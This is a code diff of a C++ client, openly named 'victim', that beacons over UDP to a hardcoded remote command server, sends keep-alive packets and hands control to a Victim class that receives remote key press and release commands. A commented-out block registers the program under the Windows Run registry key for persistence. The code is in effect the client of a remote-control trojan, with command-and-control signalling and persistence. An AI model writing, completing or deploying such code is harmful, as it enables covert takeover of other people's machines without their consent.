@@ -1,21 +1,12 @@
-#include <SFML/Network.hpp>
-#include "Mlib/Util/util.hpp"
+#include "victim.h"
 #include <iostream>
 #include <thread>
-#include <Windows.h>
-
-#define SERVER_IP "2.235.241.210"
-#define SERVER_PORT 2390
 
 /* possible messages form server:
 v: victim accepted
 e: exit
-c: connected with controller
-d: diconnected from controller
-p: key pressed
-r: key released
-s: mouse scroll
-m: mouse move
+n: key pressed
+m: key released
 */
 
 int main()
@@ -23,8 +14,16 @@ int main()
     auto keepConnected = [](sf::UdpSocket& s) {
         while (true)
         {
-            Mlib::sleep(5000);
-            s.send("r", 2, SERVER_IP, SERVER_PORT);
+            Mlib::sleep(2000);
+            s.send("r", 1, SERVER_IP, SERVER_PORT);
+        }
+    };
+    auto connectServer = [](sf::UdpSocket& s, bool& connected) {
+        while (!connected)
+        {
+            std::string init = "v" + std::to_string(int(Mlib::getTime() / 1000));
+            s.send(init.c_str(), init.size(), SERVER_IP, SERVER_PORT);
+            Mlib::sleep(2000);
         }
     };
 
@@ -33,74 +32,27 @@ int main()
     LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);   
     LONG status = RegSetValueEx(hkey, L"Victim", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));*/
 
-    bool isPaired = false; //with controller
     sf::UdpSocket ard;
     ard.bind(sf::Socket::AnyPort);
-    std::string init = "v" + std::to_string(int(Mlib::getTime()/1000));
-    ard.send(init.c_str(), init.size()+1, SERVER_IP, SERVER_PORT);
-    std::thread thr(keepConnected, std::ref(ard));
-
-connect:
     size_t size;
     sf::IpAddress ip;
     unsigned short port;
     char buf[1];
-    ard.receive(buf, sizeof(buf), size, ip, port);
+    bool connected = false;
 
-    if (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'v')
-        goto connect;
+    std::thread connect(connectServer, std::ref(ard), std::ref(connected));
+    do {
+        ard.receive(buf, sizeof(buf), size, ip, port);
+    } while (ip != SERVER_IP || port != SERVER_PORT || size != 1 || buf[0] != 'v');
+    connected = true;
+    std::thread stayAwake(keepConnected, std::ref(ard));
+    connect.join();
 
     std::cout << "started connection with server\n";
-    while (true)
-    {
-        char msg[10];
-        ard.receive(msg, sizeof(msg), size, ip, port);
-        std::cout << msg << "\n";
+    Victim victim(&ard);
+    std::thread repeatKeys(&Victim::repeatKeys, &victim);
 
-        if (ip != SERVER_IP || port != SERVER_PORT)
-            continue;
-
-        //exit program
-        if (msg[0] == 'e')
-        {
-            return 0;
-        }
-        //connected with controller
-        else if (msg[0] == 'c')
-        {
-            isPaired = true;
-        }
-        //disconnected from controller
-        else if (msg[0] == 'd')
-        {
-            isPaired = false;
-        }
-        else if (isPaired)
-        {
-            //key pressed
-            if (msg[0] == 'p')
-            {
-
-            }
-            //key released
-            else if (msg[0] == 'r')
-            {
-
-            }
-            //mouse moved
-            else if (msg[0] == 'm')
-            {
-
-            }
-            //mouse scrolled
-            else if (msg[0] == 's')
-            {
-
-            }
-        }
-    }
-
-    return -1;
+    return victim.controlVictim();
 }
 
 /*{
